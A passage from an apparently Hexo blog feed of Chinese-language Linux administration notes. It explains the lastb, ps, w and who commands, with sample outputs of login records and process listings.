<span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-tty-pts-显示指定终端的记录"><a href="#lastb-tty-pts-显示指定终端的记录" class="headerlink" title="lastb tty&#x2F;pts 显示指定终端的记录"></a>lastb tty&#x2F;pts 显示指定终端的记录</h4><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb pts/1<br><span class="hljs-keyword">test     </span>pts/1                         Thu Aug 18 23:11 - 23:11  (00:00)<br><br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><p>tty可以缩写 lastb 0 &#x3D;&#x3D; lastb tty0</p><h4 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h4><p>&#x2F;var&#x2F;log&#x2F;btmp</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>last</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ps</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/ps/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/ps/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用于查看当前进程信息</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef:基于Unix的选项，可以使用破折号(-)<br><span class="hljs-attribute">UID</span>          PID    PPID  C STIME TTY          TIME CMD<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>       <span class="hljs-number">0</span>  <span class="hljs-number">0</span> Oct27 ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">11</span> /sbin/init<br><br><span class="hljs-attribute">ps</span> aux:基于BSD的选项，不可以使用破折号(-)<br><span class="hljs-attribute">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">169640</span> <span class="hljs-number">12772</span> ?        Ss   Oct27   <span class="hljs-number">0</span>:<span class="hljs-number">11</span> /sbin/init<br><br></code></pre></td></tr></table></figure><p>备注：<br>ps -aux :打印用户名为x的所有进程，如果x的用户不存在，可能会解释为ps aux</p><p><strong>pa aux 会出现由于命令太长造成被截取的问题</strong></p><p><strong>ps -ef 输出字段解释：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/proc# ps -ef | grep http | grep -v grep<br><span class="hljs-attribute">root</span>     <span class="hljs-number">3398394</span> <span class="hljs-number">3337140</span>  <span class="hljs-number">0</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> python -m http.server<br></code></pre></td></tr></table></figure><table><thead><tr><th>UID</th><th>pid</th><th>PPID</th><th>C</th><th>STIME</th><th>TTY</th><th>TIME</th><th>CMD</th></tr></thead><tbody><tr><td>当前进程启动用户ID</td><td>进程ID</td><td>进程父ID</td><td>进程占用CPU百分比</td><td>进程启动时间</td><td>进程运行的终端，如果进程运行和终端没有关系，则显示？，如果显示pts&#x2F;0，则表示由网络连接主机的终端启动运行</td><td>该进程占用CPU的累计时间（[DD-]hh:mm:ss），</td><td>当前进程执行的命令</td></tr><tr><td>root</td><td>3398394</td><td>3337140</td><td>0</td><td>14:58</td><td>pts&#x2F;0</td><td>00:00:00</td><td>当前进程执行的命令</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>ps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w&amp;who</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/w&amp;who/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/w&amp;who/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><p>显示当前登录系统的用户信息以及当前正在做什么</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/var/log# w<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">06</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">01</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>:<span class="hljs-number">32</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">13</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w<br></code></pre></td></tr></table></figure><p> 14:17:40 up 209 days,  3:06,  2 users,  load average: 0.00, 0.01, 0.00</p><p>当前时间  运行时长  当前用户登录个数  当前系统负载 1分钟 5分钟 15分钟</p><p>USER ：登录用户</p><p>TTY：登录方式，pts 远程登录  tty 本地登录</p><p>FROM：登录来源IP</p><p>LOGIN@：登录时间</p><p>IDLE：闲置时间，也就是终端多久没有操作</p><p>JCPU：对应终端所有进程占用CPU时间，不包含过去已经完成的后台任务，但是包含当前正在运行的后台任务（The JCPU time is the time used by all processes attached to the tty.  It does not include past background jobs, but  does  include currently running background jobs.）</p><p>PCPU：对应终端当前进程占用CPU时间</p><p>WHAT：当前登录用户操作</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>w [options] user […]</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="f-不显示登录来源"><a href="#f-不显示登录来源" class="headerlink" title="-f 不显示登录来源"></a>-f 不显示登录来源</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -f</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>        LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">04m</span>  <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>     <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">4.00s</span>  <span class="hljs-number">0.55s</span>  <span class="hljs-number">0.55s</span> -bash<br>root     pts/<span class="hljs-number">1</span>     <span class="hljs-number">23</span>:<span class="hljs-number">47</span>    <span class="hljs-number">8</span>:<span class="hljs-number">52</span>   <span class="hljs-number">0.00s</span>  <span class="hljs-number">0.00s</span> -bash<br></code></pre></td></tr></table></figure><h4 id="s-精简显示"><a href="#s-精简显示" class="headerlink" title="-s 精简显示"></a>-s 精简显示</h4><p>登录用户名，登录方式，登录来源IP，闲置时间，当前操作</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -s</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">52</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM              IDLE WHAT<br>root     tty1                       <span class="hljs-number">1</span>:<span class="hljs-number">04m</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">4.00s</span> -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">9</span>:<span class="hljs-number">16</span>  -bash<br></code></pre></td></tr></table></figure><h4 id="h-不显示标题字段"><a href="#h-不显示标题字段" class="headerlink" title="-h 不显示标题字段"></a>-h 不显示标题字段</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -h</span><br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">06</span>m  <span class="hljs-number">0.10</span>s  <span class="hljs-number">0.10</span>s <span class="hljs-operator">-</span>bash<br>root     pts<span class="hljs-symbol">/0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">2.00</span>s  <span class="hljs-number">0.55</span>s  <span class="hljs-number">0.55</span>s <span class="hljs-operator">-</span>bash<br>root     pts<span class="hljs-symbol">/1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">23</span>:<span class="hljs-number">47</span>   <span class="hljs-number">10</span>:<span class="hljs-number">42</span>   <span class="hljs-number">0.00</span>s  <span class="hljs-number">0.00</span>s <span class="hljs-operator">-</span>bash<br></code></pre></td></tr></table></figure><h4 id="i-显示以主机名登录的"><a href="#i-显示以主机名登录的" class="headerlink" title="-i 显示以主机名登录的"></a>-i 显示以主机名登录的</h4><h4 id="V-显示命令版本"><a href="#V-显示命令版本" class="headerlink" title="-V 显示命令版本"></a>-V 显示命令版本</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w -V<br><span class="hljs-attribute">w</span> from procps-ng <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">17</span><br></code></pre></td></tr></table></figure><h4 id="user-显示指定用户名"><a href="#user-显示指定用户名" class="headerlink" title="user 显示指定用户名"></a>user 显示指定用户名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w root<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">49</span>:<span class="hljs-number">39</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">38</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">4</span>:<span class="hljs-number">08</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>   <span class="hljs-number">27</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">14</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s sh<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">19</span>    <span class="hljs-number">3</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">05</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w root<br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><h3 id="登录信息-var-run-utmp"><a href="#登录信息-var-run-utmp" class="headerlink" title="登录信息 &#x2F;var&#x2F;run&#x2F;utmp"></a>登录信息 &#x2F;var&#x2F;run&#x2F;utmp</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">run</span>]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br>-rw-rw-r-- 1 root utmp 4224 8月  25 09:31 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br></code></pre></td></tr></table></figure><h3 id="进程信息-proc"><a href="#进程信息-proc" class="headerlink" title="进程信息 &#x2F;proc"></a>进程信息 &#x2F;proc</h3><h1 id="who"><a href="#who" class="headerlink" title="who"></a>who</h1><p>显示当前登录用户</p><h2 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><p>登录用户名</p><p>登录方式：pts 远程登录  tty 本地登录</p><p>登录时间及登录来源IP</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>who [OPTION]… [ FILE | ARG1 ARG2 ]</p><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><h4 id="a-–all-显示所有"><a href="#a-–all-显示所有" class="headerlink" title="-a –all 显示所有"></a>-a –all 显示所有</h4><p>等同于  -b -d –login -p -r -t -T -u</p><h4 id="b-–boot-系统最近启动时间"><a href="#b-–boot-系统最近启动时间" class="headerlink" title="-b –boot 系统最近启动时间"></a>-b –boot 系统最近启动时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -b<br>         <span class="hljs-attribute">system</span> boot  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="d-–dead-输出-dead-precess"><a href="#d-–dead-输出-dead-precess" class="headerlink" title="-d –dead 输出 dead precess"></a>-d –dead 输出 dead precess</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@iZbp1191gh7vw52537lyxrZ:/<span class="hljs-comment"># who -d</span><br>         pts<span class="hljs-regexp">/3        2023-08-16 12:14            122616 id=ts/</span><span class="hljs-number">3</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/4        2023-07-11 02:37              5696 id=ts/</span><span class="hljs-number">4</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/5        2023-07-11 03:22              5983 id=ts/</span><span class="hljs-number">5</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="H-–heading-输出字段标题"><a href="#H-–heading-输出字段标题" class="headerlink" title="-H –heading 输出字段标题"></a>-H –heading 输出字段标题</h4><h4 id="–ips-输出登录主机hostname对应的ip"><a href="#–ips-输出登录主机hostname对应的ip" class="headerlink" title="–ips 输出登录主机hostname对应的ip"></a>–ips 输出登录主机hostname对应的ip</h4><p>等同于 –lookup </p><p>规范化存储IP，如果可用，就不存储主机名</p><h4 id="l-–login-输出系统登录进程"><a href="#l-–login-输出系统登录进程" class="headerlink" title="-l –login 输出系统登录进程"></a>-l –login 输出系统登录进程</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -l<br><span class="hljs-attribute">LOGIN</span>    ttyS0        <span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">25</span> <span class="hljs-number">10</span>:<span class="hljs-number">21</span>            <span class="hljs-number">306392</span> id=tyS0<br><span class="hljs-attribute">LOGIN</span>    tty1         <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span>               <span class="hljs-number">821</span> id=tty1<br></code></pre></td></tr></table></figure><h4 id="m-只显示-stdin-关联的用户名和主机名"><a href="#m-只显示-stdin-关联的用户名和主机名" class="headerlink" title="-m  只显示 stdin 关联的用户名和主机名"></a>-m  只显示 stdin 关联的用户名和主机名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -m<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="p-–process-输出初始化衍生的进程"><a href="#p-–process-输出初始化衍生的进程" class="headerlink" title="-p –process 输出初始化衍生的进程"></a>-p –process 输出初始化衍生的进程</h4><h4 id="q-–count-输出当前登录的所有用户名和数量"><a href="#q-–count-输出当前登录的所有用户名和数量" class="headerlink" title="-q –count 输出当前登录的所有用户名和数量"></a>-q –count 输出当前登录的所有用户名和数量</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># who -q</span><br>root root root<br><span class="hljs-comment"># users=3</span><br></code></pre></td></tr></table></figure><h4 id="r-–runlevel-输出当前运行级别"><a href="#r-–runlevel-输出当前运行级别" class="headerlink" title="-r –runlevel 输出当前运行级别"></a>-r –runlevel 输出当前运行级别</h4><p>默认是 5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -r<br>         <span class="hljs-attribute">run</span>-level <span class="hljs-number">5</span>  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="s-–short-只输出用户名，登录方式，时间"><a href="#s-–short-只输出用户名，登录方式，时间" class="headerlink" title="-s –short 只输出用户名，登录方式，时间"></a>-s –short 只输出用户名，登录方式，时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -s<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="t-–time-显示最后一次系统时钟更改"><a href="#t-–time-显示最后一次系统时钟更改" class="headerlink" title="-t –time 显示最后一次系统时钟更改"></a>-t –time 显示最后一次系统时钟更改</h4><h4 id="T-w-–mesg-增加用户消息状态，可能的值"><a href="#T-w-–mesg-增加用户消息状态，可能的值" class="headerlink" title="-T -w –mesg 增加用户消息状态，可能的值 + - ?"></a>-T -w –mesg 增加用户消息状态，可能的值 + - ?</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -T<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="u-–users-用户登录列表"><a href="#u-–users-用户登录列表" class="headerlink" title="-u –users 用户登录列表"></a>-u –users 用户登录列表</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -u<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">09</span>      <span class="hljs-number">572714</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">05</span>      <span class="hljs-number">572786</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>   .        <span class="hljs-number">573045</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h2 id="数据来源-1"><a href="#数据来源-1" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>procdir</title>
    <link href="/2024/03/15/yunwei/filesystem/procdir/"/>
    <url>/2024/03/15/yunwei/filesystem/procdir/</url>
    
